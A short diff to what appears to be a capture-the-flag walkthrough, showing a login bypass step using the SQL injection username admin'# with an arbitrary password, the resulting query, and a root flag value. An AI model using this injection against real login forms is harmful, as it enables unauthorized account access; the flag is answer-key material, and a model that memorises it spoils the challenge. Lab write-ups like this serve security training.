@@ -69,9 +69,10 @@ congratulations
 
 	- go to the login page of the website and do an sql injection
 	user: admin'#
-	pass: any password
+	pass: anypassword
 	
 	- this will comment out the password and only login using the user
+	SELECT * FROM users WHERE username='admin'#' AND password='anypassword'
 	
 11. Submit root flag<br>
 e3d0796d002a446c0e622226f42e9672
